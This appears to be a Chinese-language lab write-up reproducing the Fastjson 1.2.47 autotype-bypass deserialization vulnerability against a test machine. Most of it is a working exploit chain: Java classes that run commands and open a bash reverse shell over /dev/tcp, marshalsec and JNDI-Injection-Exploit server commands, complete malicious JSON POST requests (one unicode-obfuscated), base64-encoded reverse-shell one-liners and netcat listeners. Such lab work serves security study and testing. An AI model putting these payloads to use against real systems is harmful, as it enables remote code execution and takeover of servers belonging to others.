# 0x00 漏洞概述
Fastjson是阿里巴巴公司开源的一款json解析器，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean，被广泛应用于各大厂商的Java项目中。
​

首先，Fastjson提供了`autotype`功能，允许用户在反序列化数据中通过“@type”指定反序列化的类型。
其次，Fastjson自定义的反序列化机制时会调用指定类中的setter方法及部分getter方法，那么当组件开启了`autotype`功能并且反序列化不可信数据时，攻击者可以构造数据，使目标应用的代码执行流程进入特定类的特定setter或者getter方法中，若指定类的指定方法中有可被恶意利用的逻辑（也就是通常所指的 `Gadget` ），则会造成一些严重的安全问题。
Fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。
即在Fastjson 1.2.47及以下版本中，利用其缓存机制可实现对未开启`autotype`功能的绕过。
# 0x01 影响范围

- fastjson<=1.2.47

​

# 0x02 漏洞分析

- [https://www.anquanke.com/post/id/181874](https://www.anquanke.com/post/id/181874)
# 0x03 环境搭建
kali：192.168.210.156

靶机：192.168.210.206

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1644997917043-1e9bc0b8-3b10-4ad2-b857-48e99885a3bd.png#clientId=u3b476d97-623c-4&from=paste&height=154&id=u96009385&margin=%5Bobject%20Object%5D&name=image.png&originHeight=205&originWidth=455&originalType=binary&ratio=1&size=20961&status=done&style=none&taskId=ue6c9b5b0-9c1f-4f14-b855-abe391e82ae&width=341)
# 0x04 漏洞复现
目标环境是`openjdk:8u102`，这个版本没有`com.sun.jndi.rmi.object.trustURLCodebase`的限制，我们可以简单利用RMI进行命令执行。
## 4.1 marshalsec工具
### 1、在靶机创建文件
#### 1）创建恶意java文件 -> class文件
首先编译并上传命令执行代码，如`[http://evil.com/TouchFile.class`](http://evil.com/TouchFile.class`)：
```shell
// javac TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}

```
将TouchFile.java编译成class文件
`javac TouchFile.java`


使用python开启站点：
`python3 -m http.server 8888`

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645004606629-60b0f1ec-6f57-44d3-8215-8a79e23d4952.png#clientId=u1557c07f-9e0b-4&from=paste&id=u76616c16&margin=%5Bobject%20Object%5D&name=image.png&originHeight=113&originWidth=628&originalType=binary&ratio=1&size=47632&status=done&style=none&taskId=u3d093954-923a-4c4b-854c-dfa462628e1)


#### 2）编译使用java反序列化工具marshalsec
然后借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类TouchFile.class：（marshalsec-0.0.3-SNAPSHOT-all.jar需要下载，编译，特别坑）
安装mvn
```bash
1、下载mvn
wget http://mirrors.cnnic.cn/apache/maven/maven-3/3.5.4/binaries/apache-maven-3.5.4-bin.tar.gz

2、解压安装
tar -zxvf apache-maven-3.5.4-bin.tar.gz

3、版本控制
update-alternatives --install /usr/bin/mvn mvn /opt/apache-maven-3.5.4/bin/mvn 1

4、在/etc/profile中配置maven环境变量
这里路径写/opt/apache-maven-3.5.4，就是maven安装路径。

# maven
export MAVEN_HOME=/opt/apache-maven-3.5.4
export PATH=$PATH:$MAVEN_HOME/bin

5、使配置生效
source /etc/profile

进入环境后查看mvn版本，出现以下界面则maven成功安装。

```

![image.png](https://cdn.nlark.com/yuque/0/2021/png/22669825/1637770914815-e0f0101e-a18c-4bd6-a7a6-7c219b7f10e6.png#clientId=u3ffa8ee0-3db9-4&from=paste&height=117&id=ubf586b7f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=117&originWidth=554&originalType=binary&ratio=1&size=69274&status=done&style=none&taskId=u8ca34e23-f453-4bff-b3e2-2b47ce2ade0&width=554)


安装marshalsec
```bash
git clone https://github.com/mbechler/marshalsec.git

cd marshalsec/

# 进入mvn环境
source /etc/profile

mvn clean package -DskipTests
```
​

当查看到绿色的SUCCESS时，即可成功编译好marshalsec的jar包：

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645005362619-34ac88e4-f688-4f2f-a025-f07fade037fe.png#clientId=u187b60f6-3740-4&from=paste&height=122&id=uc80b08d9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=994&originalType=binary&ratio=1&size=86125&status=done&style=none&taskId=u1f9eabfb-67bf-477f-bf58-5bbf5f67b4d&width=746)


[java 反序列化利用工具 marshalsec 使用简介](https://blog.csdn.net/whatday/article/details/107942941)


然后我们借助[marshalsec](https://github.com/mbechler/marshalsec)项目，启动一个 RMI 服务器，监听 9999 端口，并制定加载远程类TouchFile.class：
```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.210.156:8888/#TouchFile" 9999

```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645005611688-25fd1914-d80a-407f-ab7e-26d0d9faffd3.png#clientId=ub399f6d8-8991-4&from=paste&id=myE7h&margin=%5Bobject%20Object%5D&name=image.png&originHeight=89&originWidth=1248&originalType=binary&ratio=1&size=24548&status=done&style=none&taskId=u97f0888b-2376-4ae5-a685-77e3e814bf6)

#### 
#### 3）burp传恶意json数据
重新访问页面，抓包修改请求为POST，上传恶意json文件。
注意要有 `Content-Type: application/json`，截图有误。
```shell
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.210.156:9999/Exploit",
        "autoCommit":true
    }
}
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645010118882-d0f2bc28-5f41-4c9b-8d70-7e0a8a7935ae.png#clientId=ue85efe70-9394-4&from=paste&id=u26ede270&margin=%5Bobject%20Object%5D&name=image.png&originHeight=573&originWidth=1533&originalType=binary&ratio=1&size=102697&status=done&style=none&taskId=u9a5c1ade-db87-441c-a717-1c9d2fa06da)

进入靶机查看结果：

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645009985863-ae654a96-2b22-4637-9466-e566ebdcefc3.png#clientId=ud2d22a83-8a5f-4&from=paste&id=u4903bb8c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=44&originWidth=273&originalType=binary&ratio=1&size=6620&status=done&style=none&taskId=u3fcb7d69-0897-476c-ac2d-7f0b6083504)




### 2、反弹shell
参考链接：

- [fastjson反弹shell](https://blog.csdn.net/guo15890025019/article/details/120532891)​
#### 1）制作反弹shell的java文件 -> class文件
**ReverseShell.java 如下：**
```bash
import java.lang.Runtime;
import java.lang.Process;

public class ReverseShell {
 static {
     try {
         Runtime rt = Runtime.getRuntime();
         String[] commands = {"/bin/bash","-c","bash -i >& /dev/tcp/攻击方ip/4444 0>&1"};
         Process pc = rt.exec(commands);
         pc.waitFor();
     } catch (Exception e) {
    		 // do nothing
         
     }	 
 }
}

```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645010750993-675e544d-5dad-4731-bab1-5148db18d3d8.png#clientId=u7cd9ae79-4115-4&from=paste&id=ub2f0d580&margin=%5Bobject%20Object%5D&name=image.png&originHeight=296&originWidth=809&originalType=binary&ratio=1&size=42494&status=done&style=none&taskId=ua98d309d-8b21-4e32-90b5-b59f7600fd8)


生成class文件：
`javac ReverseShell.java`
​

#### 2）python3开启http服务
ReverseShell.class文件所在处开启http服务
`python3 -m http.server 8888`

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645010342714-e663670c-4296-4203-992e-493f14bc6cd9.png#clientId=u7cd9ae79-4115-4&from=paste&id=uf7084c92&margin=%5Bobject%20Object%5D&name=image.png&originHeight=103&originWidth=1096&originalType=binary&ratio=1&size=29265&status=done&style=none&taskId=ud236eff3-9a18-4844-82c2-a285f3eeecf)

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645010419592-94fb8d4c-6556-47a1-b694-d5d4d4e33cd3.png#clientId=u7cd9ae79-4115-4&from=paste&id=u51a954c4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=99&originWidth=822&originalType=binary&ratio=1&size=26306&status=done&style=none&taskId=u730016ca-c61e-4d72-8b53-a32332b374a)

#### 3）kali开启监听
`nc -lvvp 4444`
​

#### 4）使用marshalsec
marshalsec使用RMI利用模块：
```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://攻击方ip:8888/#ReverseShell" 9999
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645010452252-9502dc9d-9b1b-4e7e-80d7-29454688dbba.png#clientId=u7cd9ae79-4115-4&from=paste&id=uec79cbda&margin=%5Bobject%20Object%5D&name=image.png&originHeight=84&originWidth=1320&originalType=binary&ratio=1&size=27866&status=done&style=none&taskId=u07f15051-9834-4af3-a097-b5345415c1d)


#### 5）burp传恶意json数据
```shell
POST / HTTP/1.1
Host: 192.168.210.206:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 270

{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://192.168.210.156:9999/ReverseShell",
        "autoCommit":true
    }
}
```


![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645010524734-270611a1-5b20-4bac-89ea-5a310844ea65.png#clientId=u7cd9ae79-4115-4&from=paste&id=u03d2c34d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=504&originWidth=1058&originalType=binary&ratio=1&size=63112&status=done&style=none&taskId=uee2c5f2b-b336-43b2-83e1-fc5aa25901a)


#### 6）kali收到shell

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645010550161-56df26a1-ffc2-42cb-8cc4-6491ad6cd557.png#clientId=u7cd9ae79-4115-4&from=paste&id=ueca5fb4f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=335&originWidth=772&originalType=binary&ratio=1&size=71263&status=done&style=none&taskId=u9f394fee-98ec-4d8a-8868-228704c1e67)


## 4.2 fastjson_tool 工具
### 1、使用dnslog验证是否存在漏洞
1）开启一个LDAP服务，命令用base64编码，Fastjson1.2.47使用第二个payload
```shell
java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.210.156 9988 "bash -c {echo,cGluZyA0b296aGcuZG5zbG9nLmNu}|{base64,-d}|{bash,-i}"
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645078705760-37933c98-454b-4d54-ade2-818579b3aab9.png#clientId=u99fb2d32-3b09-4&from=paste&id=u020f9195&margin=%5Bobject%20Object%5D&name=image.png&originHeight=112&originWidth=1640&originalType=binary&ratio=1&size=46512&status=done&style=none&taskId=u397b883b-b71a-418b-bb96-9605708c192)
​

2）使用burp发送恶意json数据（POST数据包）

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645078755953-31aacbb4-774f-41d0-b239-831abd2f637e.png#clientId=u99fb2d32-3b09-4&from=paste&height=349&id=u5d7ebfba&margin=%5Bobject%20Object%5D&name=image.png&originHeight=466&originWidth=1123&originalType=binary&ratio=1&size=72100&status=done&style=none&taskId=ub3cd460c-78db-4ccd-9cdc-2345f47ecdb&width=842)
​

3）LDAP服务有连接记录：

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645078612079-35d480ea-7342-4c32-97db-cead2c4d73b1.png#clientId=u99fb2d32-3b09-4&from=paste&id=u73e7d5e8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=217&originWidth=1625&originalType=binary&ratio=1&size=83087&status=done&style=none&taskId=ub962a262-4e5a-4a24-8238-30be217860c)
​

4）查看dnslog有解析记录，证明漏洞存在。


![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645903983799-c83a9cf0-a04c-4d6a-b805-84c258121769.png#clientId=u5df42e45-922d-4&from=paste&height=164&id=u315ef210&margin=%5Bobject%20Object%5D&name=image.png&originHeight=327&originWidth=741&originalType=binary&ratio=1&size=59874&status=done&style=none&taskId=u6f7e6268-5acc-4ce7-a22f-3154615af29&width=371)

### 2、反弹shell
1）开启一个LDAP服务，命令用base64编码，Fastjson1.2.47使用第二个payload
```shell
java -cp fastjson_tool.jar fastjson.HRMIServer 192.168.210.156 9988 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxMC4xNTYvMTExMSAwPiYx}|{base64,-d}|{bash,-i}"
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645067790992-e66be258-611f-4493-9423-9802b2575d3d.png#clientId=u911901bf-4e8c-4&from=paste&id=ud2aab007&margin=%5Bobject%20Object%5D&name=image.png&originHeight=114&originWidth=1637&originalType=binary&ratio=1&size=55765&status=done&style=none&taskId=ucd1cb4fe-e663-4243-96f5-d7dc0ea7782)


2）使用burp发送恶意json数据（POST数据包），LDAP服务有连接记录

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645078327238-b6e7d74a-5620-4b26-8610-9c56d3f2258a.png#clientId=u99fb2d32-3b09-4&from=paste&id=u479f58b3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=232&originWidth=1646&originalType=binary&ratio=1&size=89903&status=done&style=none&taskId=u758b4c97-dc16-44b0-8275-e623709457e)
​

3）成功反弹

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645078936843-2e8a2b44-3a05-4eb7-9cc9-315256311c69.png#clientId=u99fb2d32-3b09-4&from=paste&height=130&id=uab19dcfd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=173&originWidth=618&originalType=binary&ratio=1&size=33396&status=done&style=none&taskId=u4a2a8c5a-9257-4f50-9d6f-e5662c4fde9&width=464)

## 
## 4.4 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar
1、使用burp插件检测Fastjson时，要抓取数据包修改POST，再加上json格式数据，然后`Forword`即可检测。

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645904083428-168d8a48-2218-4fbe-9ddb-ccc973c0166a.png#clientId=u5df42e45-922d-4&from=paste&height=764&id=u3b9eff58&margin=%5Bobject%20Object%5D&name=image.png&originHeight=764&originWidth=1349&originalType=binary&ratio=1&size=121987&status=done&style=none&taskId=u9362116c-36f4-4da6-b8cd-09a28c42960&width=1349)


2、开启一个LDAP服务，命令经过base64编码
```shell
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIxMC4xNTYvMTExMSAwPiYx}|{base64,-d}|{bash,-i}" -A "192.168.210.156"
```
3、攻击机监听端口
`nc -lvvp 1111`
​

4、burp发送恶意json数据
```shell
POST / HTTP/1.1
Host: 192.168.210.206:8090
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 692

{"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"ldap://192.168.210.156:1389/cqydk3","autoCommit":true}}
```

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645070245258-4a4ec40f-bacd-48c8-adb6-50327e4453e1.png#clientId=u99fb2d32-3b09-4&from=paste&id=u5c10ce99&margin=%5Bobject%20Object%5D&name=image.png&originHeight=517&originWidth=1008&originalType=binary&ratio=1&size=61348&status=done&style=none&taskId=u77a1e4ef-c8df-4d3c-bb2c-7e3ac5c8eb2)


![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645070325588-73143af3-e870-4c9d-8dcd-cbf6c3733838.png#clientId=u99fb2d32-3b09-4&from=paste&id=ub385ea69&margin=%5Bobject%20Object%5D&name=image.png&originHeight=370&originWidth=1631&originalType=binary&ratio=1&size=136531&status=done&style=none&taskId=u18986c91-2e83-4ad3-b709-23cfd0afffb)
​

5、成功反弹shell

![image.png](https://cdn.nlark.com/yuque/0/2022/png/22669825/1645070564105-be5753dc-d2c9-4d87-87a2-a43286ca8822.png#clientId=u99fb2d32-3b09-4&from=paste&id=uaa1072cb&margin=%5Bobject%20Object%5D&name=image.png&originHeight=164&originWidth=611&originalType=binary&ratio=1&size=28204&status=done&style=none&taskId=u70787ba2-21b9-44cb-b726-03c3b7a9f9d)
